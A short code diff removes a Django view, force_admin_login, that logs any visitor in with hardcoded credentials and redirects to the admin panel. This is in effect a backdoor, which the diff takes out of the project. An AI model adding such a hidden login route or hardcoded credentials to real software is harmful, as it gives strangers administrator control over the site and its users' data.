@@ -1162,14 +1162,5 @@ def contact(request):
 
     return render(request, 'contact.html', {'form': form})
 
-from django.contrib.auth import authenticate, login
-from django.shortcuts import redirect
-from django.http import HttpResponse
 
-def force_admin_login(request):
-    user = authenticate(username='neverforgottentest', password='12345')
-    if user:
-        login(request, user)
-        return redirect('/admin/')
-    return HttpResponse("Login failed")
 
